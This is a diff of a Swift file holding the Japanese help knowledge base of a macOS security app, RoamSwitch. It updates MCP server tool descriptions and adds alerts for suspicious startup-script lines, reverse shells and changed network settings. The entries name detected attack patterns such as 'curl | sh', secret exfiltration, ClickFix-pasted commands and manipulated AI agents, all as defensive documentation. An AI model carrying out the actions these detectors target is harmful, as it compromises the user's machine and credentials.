@@ -726,15 +780,16 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "feat_mcp_server",
-                title: "MCPサーバー連携（AIアシスタントからの読み取り専用アクセス）",
-                summary: "RoamSwitch.appには読み取り専用のMCP（Model Context Protocol）サーバーが同梱されており、ClaudeなどのAIアシスタントからMacのセキュリティ状況を問い合わせられます。設定変更や遮断などの操作系ツールは一切ありません。",
+                title: "MCPサーバー連携（AIアシスタントからのアクセス）",
+                summary: "RoamSwitch.appにはMCP（Model Context Protocol）サーバーが同梱されており、ClaudeなどのAIアシスタントからMacのセキュリティ状況を問い合わせられます。設定・保護レベル・ポート・デバイスを変更するツールは一切ありません。書き込みを伴うのは、自身の記録ファイルを更新する3つのツールだけです。",
                 details: """
                 • 通信: ローカルの標準入出力（stdio）のみ。バイナリは `/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`。
-                • 主なツール（全34種）: `get_security_report`（総合診断）、`verify_security_findings`（診断の指摘が今も残っているかの再確認・読み取り専用）、`get_exposed_ports`、`get_guard_status`、`audit_url_safety`、`audit_secrets`、`audit_mcp_configs`（MCPクライアントの設定ファイルにある危険な記述を点検。第三者の文章を読むサーバーとコマンド実行系のサーバーが同じ設定にある構成（間接プロンプトインジェクションの前提）も指摘する。ローカル・読み取り専用。メニュー「マルウェア対策」→「🧩 MCP設定（AI連携）を監査…」の専用画面でも実行できる）、`audit_agent_setup`（AIエージェントに読ませる指示ファイル・スキルとOpenClawの設定にある危険な記述を点検。見えないUnicode文字・指示の上書き・curl | sh・秘密の持ち出しの形など。ローカル・読み取り専用。メニュー「マルウェア対策」→「🤖 AIエージェントの指示ファイルを監査…」の専用画面でも実行できる）、`audit_security_logs`、`get_quarantine_status`、`get_notification_history`、`get_canary_status`、`get_port_anomaly_incidents`、`get_ssh_guard_incidents`（SSH総当たりの記録と最近のSSHログイン・読み取り専用）、`get_runtime_threat_status`、`get_incident_timeline`（封じ込めインシデント履歴）、`get_detection_coverage`（RoamSwitchが検知できない攻撃手口を一覧にして確認。読み取り専用）、`get_network_history`（ネットワーク履歴学習）、`run_package_cve_scan`、`run_package_cve_scan_languages`、`run_active_vuln_scan`（127.0.0.1への非破壊プローブのみ）、`run_npm_audit_signatures`（外部サーバー=npmレジストリへ通信する唯一のツール。Pro・オプトイン）、`get_app_help`（このナレッジベース）。
+                • 主なツール（全35種）: `get_security_report`（総合診断）、`verify_security_findings`（診断の指摘が今も残っているかの再確認・読み取り専用）、`get_exposed_ports`、`get_guard_status`、`audit_url_safety`、`audit_secrets`、`audit_mcp_configs`（MCPクライアントの設定ファイルにある危険な記述を点検。第三者の文章を読むサーバーとコマンド実行系のサーバーが同じ設定にある構成（間接プロンプトインジェクションの前提）も指摘する。ローカル・読み取り専用。メニュー「マルウェア対策」→「🧩 MCP設定（AI連携）を監査…」の専用画面でも実行できる）、`audit_agent_setup`（AIエージェントに読ませる指示ファイル・スキルとOpenClawの設定にある危険な記述を点検。見えないUnicode文字・指示の上書き・curl | sh・秘密の持ち出しの形など。エージェントのメモリも同じ規則で点検し、登録したプロジェクトの `.vscode/tasks.json`（フォルダを開くと自動で実行されるタスク）と `.github/workflows`（プルリクエストのコードの実行・他人の文字列のスクリプトへの埋め込み・コミットで固定していない外部アクション）も点検。Claude Code の設定（`~/.claude` と、登録したプロジェクトの `.claude` にある `settings.json`・`settings.local.json`）では、確認なしにすべてを実行する権限モード、どんなコマンドも許可する広すぎる許可、フック、API の接続先の変更も点検し、確認済みにした後で設定が緩くなったこと（禁止ルールの削除、広い許可やフックの追加、権限モードの引き上げ、サンドボックスの無効化）も指摘。ルールやコマンドの文字は結果に出さない。ローカル・読み取り専用。メニュー「マルウェア対策」→「🤖 AIエージェントの指示ファイルを監査…」の専用画面でも実行できる）、`audit_security_logs`、`get_quarantine_status`、`get_notification_history`、`get_canary_status`、`get_port_anomaly_incidents`、`get_ssh_guard_incidents`（SSH総当たりの記録と最近のSSHログイン・読み取り専用）、`get_runtime_threat_status`、`get_incident_timeline`（封じ込めインシデント履歴）、`get_detection_coverage`（RoamSwitchが検知できない攻撃手口を一覧にして確認。読み取り専用）、`get_network_history`（ネットワーク履歴学習）、`run_package_cve_scan`、`run_package_cve_scan_languages`、`run_active_vuln_scan`（127.0.0.1への非破壊プローブのみ）、`run_npm_audit_signatures`（外部サーバー=npmレジストリへ通信する唯一のツール。Pro・オプトイン）、`get_app_help`（このナレッジベース）。
                 • プロセス実行の記録(Pro・読み取り専用): `search_exec_events`(起動イベントの検索)、`get_process_tree`(祖先・子孫のプロセスツリー)。
                 • リソース: `roamswitch://docs/features`、`roamswitch://docs/alerts-and-messages`、`roamswitch://docs/settings-guide`、`roamswitch://docs/troubleshooting`。
                 • 言語: 回答はアプリの言語設定に従います。`get_app_help` は `language` 引数（ja / en / zh-Hans / zh-Hant / ko / de / fr / es / it / pt-PT）で言語を指定できます。
-                • 安全設計: 読み取り専用のため、プロンプトインジェクションでAIに悪用されても保護レベルの変更やポート隔離などは実行できません。
+                • 書き込みを伴うツール: `run_active_vuln_scan`(結果をローカルのスキャン履歴に追記)、`audit_security_logs`(ログパターンの基準と通知履歴を更新)、`run_npm_audit_signatures`(npmが自身のキャッシュとログを書く)は、ローカルに状態を書くため、MCPの読み取り専用ヒントは偽になっています。設定や保護レベルを変えるツールはありません。
+                • 安全設計: 設定や保護レベルを変えるツールがないため、プロンプトインジェクションでAIに悪用されても保護レベルの変更やポート隔離などは実行できません。
                 """,
                 recommendation: "設定手順は faq_mcp_setup を参照してください。「このMacは今安全？」「この通知はどういう意味？」のように自然な言葉で質問できます。"
             ),
@@ -895,7 +950,7 @@ extension RoamSwitchKnowledgeBase {
                 """,
                 recommendation: """
                 1. 心当たりがなければ何もする必要はありません。そのページで情報を入力しないでください。
-                2. 業務で使う正規のサイトが誤って遮断された場合は、通知の「今回は許可 (5分)」で一時的に許可するか、許可リストに追加してください。
+                2. 業務で使う正規のサイトが誤って遮断された場合は、通知の「今回は許可 (5分)」で一時的に許可してください。
                 """
             ),
             LocalizedEntry(
@@ -1075,6 +1130,51 @@ extension RoamSwitchKnowledgeBase {
                 """
             ),
             LocalizedEntry(
+                id: "alert_new_startup_script",
+                title: "🚨 自動実行される場所に不審な記述を検知しました",
+                summary: "シェルの起動ファイル（`.zshrc` など）、`~/.ssh/rc`、定期スクリプト、gitフック、ログイン/ログアウトフック、フォルダアクションのスクリプトに、不審な行が現れた、または不審なフックが設定された際の警告です。",
+                details: """
+                • 発生原因: 情報窃取マルウェアなどが、ログインや端末の起動のたびに自動で動くように書き込んだ。または、自分や使っているツールが編集した。
+                • 自動防御: 通知のみ（書き込み自体は止められません）。通知にファイルのパス、不審な行、判定理由を表示します。
+                """,
+                recommendation: """
+                1. 直前に自分でそのファイルを編集した、またはツールをインストールしたか確認してください。心当たりがあれば対応は不要です。
+                2. 心当たりがなければ、通知に表示された行を削除してください。ログイン/ログアウトフックの場合は、設定そのものを外してください。
+                3. その行が呼び出すプログラムも削除し、Macを再起動して、ClamAVスキャンを実行してください。
+                """
+            ),
+            LocalizedEntry(
+                id: "alert_reverse_shell",
+                title: "🐚 リバースシェルの疑いを検知しました",
+                summary: "シェルやインタプリタの入力と出力が、外部サーバーへの接続になっています。攻撃者がこのMacを遠隔から操作している可能性があります。",
+                details: """
+                • 通知の内容: プログラムのパスとPID、相手のアドレス、親プロセス、コマンドラインです。
+                • よくある原因: 悪意あるパッケージのインストールスクリプト、ClickFix(偽のエラー画面に誘導されて貼り付けたコマンド)、AIエージェントが誘導されて実行したコマンドなどです。外部のサーバーにシェルを渡す正規のリモート操作ツールでも出ます。
+                • 自動の対処: 通知のみです。プロセスもネットワークも止めません。
+                """,
+                recommendation: """
+                1. 通知のパスと親プロセス、コマンドを見て、自分の操作か確認する。
+                2. 心当たりがなければ、Wi-Fiを切るかケーブルを抜き、そのプロセスを終了する。
+                3. 起動元(親プロセス、直前に実行したコマンド、プロセス実行レコーダーの記録=feat_exec_recorder)を調べ、漏れた可能性のある認証情報を変更する。
+                4. 心当たりのある使い方なら、メニューの「直近のリバースシェル検知を許可リストに追加…」で許可する。
+                """
+            ),
+            LocalizedEntry(
+                id: "alert_network_settings_changed",
+                title: "🌐 ネットワーク設定が以前と違います",
+                summary: "接続中のネットワークが配ったDNSサーバーやルーター、プロキシ自動構成(PAC)が、同じネットワークの以前の状態と違います。偽のDHCPサーバーやWPADによる中間者攻撃の可能性があります。",
+                details: """
+                • 通知の内容: ネットワーク名と、以前は見なかったDNSサーバー、ルーター、PACのホスト、またはWPADがオンになったことです。
+                • 無害な原因の例: ルーターやプロバイダーの交換、設定変更。会社や学校のネットワークで管理者が設定を変えた場合。
+                • 自動の対処: 通知のみです。設定の変更も、通信の遮断も行いません。同じ内容の通知は1回だけです。
+                """,
+                recommendation: """
+                1. ルーターやプロバイダーを変えた覚えがあれば、メニューの「ネットワーク設定の基準を現在の状態に更新…」で受け入れる。
+                2. 覚えがなければ、そのネットワークの利用を止め、モバイル回線などの信頼できる接続に切り替える。
+                3. WPADがオンだった場合は、システム設定 > ネットワーク > 使用中の接続 > 詳細 > プロキシ で「プロキシを自動検出」をオフにする。
+                """
+            ),
+            LocalizedEntry(
                 id: "alert_docker_risk",
                 title: "⚠️ リスクのあるDockerコンテナ設定を検知",
                 summary: "`--privileged` で起動したコンテナ、または `docker.sock` をマウントしたコンテナが新しく起動したことを知らせる通知です。",
@@ -1206,7 +1306,7 @@ extension RoamSwitchKnowledgeBase {
                 title: "Pro有効化時に自動でオンになるガードと、オプトインのガード",
                 summary: "Proライセンスを初めて有効化すると、通知が中心で誤検知が少なく、追加の権限や設定が要らない自律防御ガードが自動でオンになります。通常の利用を妨げうるものや、追加の権限・設定・外部通信が要るものはオプトインのままです。その後は各ガードでユーザーが選んだオン / オフが尊重されます。",
                 details: """
-                • 自動でオン（初回のPro有効化時に1回だけ）: 未知のリスニングポートの自動遮断、着信ポートスキャン検知（検知元を10分間自動遮断することを含む）、SSH総当たり検知（リモートログインがオンのときだけ働く）、ランサムウェアおとりファイル検知とエントロピー検知、認証情報ハニートークン、ARPスプーフィング検知時の自動遮断、XProtectのマルウェア検知時の自動ネットワーク遮断、自動ログ監査、重要システムファイルの改ざん監視、依存関係ロックファイルの改ざん監視。ARPとXProtectの自動遮断がオンになった際は、その旨の案内を1度だけ表示します。
+                • 自動でオン（初回のPro有効化時に1回だけ）: 未知のリスニングポートの自動遮断、着信ポートスキャン検知（検知元を10分間自動遮断することを含む）、SSH総当たり検知（リモートログインがオンのときだけ働く）、ランサムウェアおとりファイル検知とエントロピー検知、認証情報ハニートークン、ARPスプーフィング検知時の自動遮断、XProtectのマルウェア検知時の自動ネットワーク遮断、自動ログ監査、重要システムファイルの改ざん監視、依存関係ロックファイルの改ざん監視、リバースシェルの常時検知、ネットワーク設定の変化の監視。ARPとXProtectの自動遮断がオンになった際は、その旨の案内を1度だけ表示します。
                 • Proで既定オン: Web・メール保護、自動起動登録(LaunchAgent/Daemon)の監視、DNS脅威保護（外出先のネットワークにだけ適用）、リンク保護（明らかな詐欺サイトの自動ブロック）。
                 • 既定オフ（オプトイン）: ClickFix対策の自動遮断、Dockerリスク検知、BadUSB物理ポートガード、USBストレージ自動遮断、ゲートウェイARP/NDP固定、Bluetooth自動オフ、プロセス実行の記録、ブラウザ認証情報アクセス監視、VPNトンネル、Sensorペアリング、実証型脆弱性診断、npm署名検証。それぞれ、通常の利用を妨げうる（ネットワークの遮断、入力機器、外付けドライブ、音声）、追加の権限やインストール（フルディスクアクセス、アクセシビリティ、blueutil）が要る、許可リストなど利用者自身の設定が要る、外部のサーバーと通信する、のいずれかに当たるためです。DNS脅威保護のプロバイダーは任意で選べます。
                 • 無料でも既定オン: クリップボード保護（APIキー・ClickFixコマンド）。
@@ -1252,13 +1352,13 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "set_link_guard_modes",
-                title: "リンク保護のモード・自動更新・システム拡張・許可リスト (Pro)",
+                title: "リンク保護のモード・自動更新・システム拡張・一時許可 (Pro)",
                 summary: "リンク保護の動作モード、脅威フィードの自動更新、システム拡張の承認状態、誤遮断時の許可を設定します。",
                 details: """
                 • モード: メニュー「リンク保護 (フィッシング接続の検知) (Pro)」で「オフ」「警告のみ (遮断しない)」「明らかな詐欺サイトは自動でブロック (推奨)」を選択。警告モードはシステム拡張が有効な場合のみ機能します。
                 • 自動更新: 「自動更新: オン (受信のみ)」をクリックでオフに切替。オフでも同梱データとホモグラフ検知で動作します。フィードのバージョンと件数はメニューに表示されます。
                 • 強制ポイントの表示: 「強制ポイント: システム拡張 (DoH 対応)」「強制ポイント: hosts フォールバック」「システム拡張を有効化中…」「システム拡張エラー」。承認待ちの場合は「システム拡張を承認 (システム設定を開く)…」が表示されます。
-                • 許可・ブロック: ブロック通知の「今回は許可 (5分)」で5分間だけ許可。警告パネルの「許可する」「ブロックする」は記憶されます。
+                • 許可・ブロック: ブロック通知の「今回は許可 (5分)」と警告パネルの「許可する」は、どちらも5分間だけ許可します（アプリを終了して開き直しても、5分で終わります）。警告パネルの「ブロックする」は記憶されます。
                 """,
                 recommendation: "システム拡張を承認し、「自動ブロック」＋「自動更新: オン」で使うのが最も効果的です。"
             ),
@@ -1295,11 +1395,11 @@ extension RoamSwitchKnowledgeBase {
             LocalizedEntry(
                 id: "faq_free_vs_pro",
                 title: "無料版とPro永続版の違い",
-                summary: "無料版でもネットワークに応じた自動保護切替や18項目の総合診断など、基本的な防御と各種の手動診断ツールを無期限で利用できます。Pro版では自動隔離・リアルタイム防御・自律巡回の警告などがアンロックされます。",
+                summary: "無料版でもネットワークに応じた自動保護切替や21項目の総合診断など、基本的な防御と各種の手動診断ツールを無期限で利用できます。Pro版では自動隔離・リアルタイム防御・自律巡回の警告などがアンロックされます。",
                 details: """
                 【無料版】
                 • Wi-Fi・ネットワークに応じたpfパケットフィルタの3段階自動切替、共有サービス・AirDropの自動停止と復元
-                • Macセキュリティ総合診断（18項目）、XProtect稼働確認とファイル・アプリの安全性診断
+                • Macセキュリティ総合診断（21項目）、XProtect稼働確認とファイル・アプリの安全性診断
                 • 外部公開ポート・USBデバイスの一覧表示
                 • リンク安全性診断、機密情報・APIキー漏洩の手動監査、クリップボード保護
                 • パッケージCVE照合、実証型脆弱性診断、Macセキュリティログ監査、通知履歴
@@ -1455,8 +1555,8 @@ extension RoamSwitchKnowledgeBase {
                 title: "リンク保護で正規のサイトがブロックされる / 接続が保留される",
                 summary: "リンク保護が誤ってサイトを遮断した、または警告モードで保留された場合の対処法です。",
                 details: """
-                • 一時的に許可: ブロック通知の「今回は許可 (5分)」。
-                • 恒久的に許可: 警告パネルで「許可する」を選ぶと記憶されます。
+                • 一時的に許可: ブロック通知の「今回は許可 (5分)」、または警告パネルの「許可する」。どちらも5分で終わります。
+                • 記憶される選択: 警告パネルの「ブロックする」だけが記憶されます。「許可する」は5分間です。
                 • 保留が勝手に遮断された: 警告モードは約8秒以内に回答がないと遮断します（フェイルクローズ）。遮断結果はキャッシュしないため、ページを再読み込みすると再度確認が表示されます。
                 • 通知が見えない: macOSの通知スタイルがバナーだとボタンが隠れることがあるため、最前面のパネルも表示されます。集中モード中などは通知履歴を確認してください。
                 • 一時的に無効化: モードを「警告のみ (遮断しない)」または「オフ」に変更。
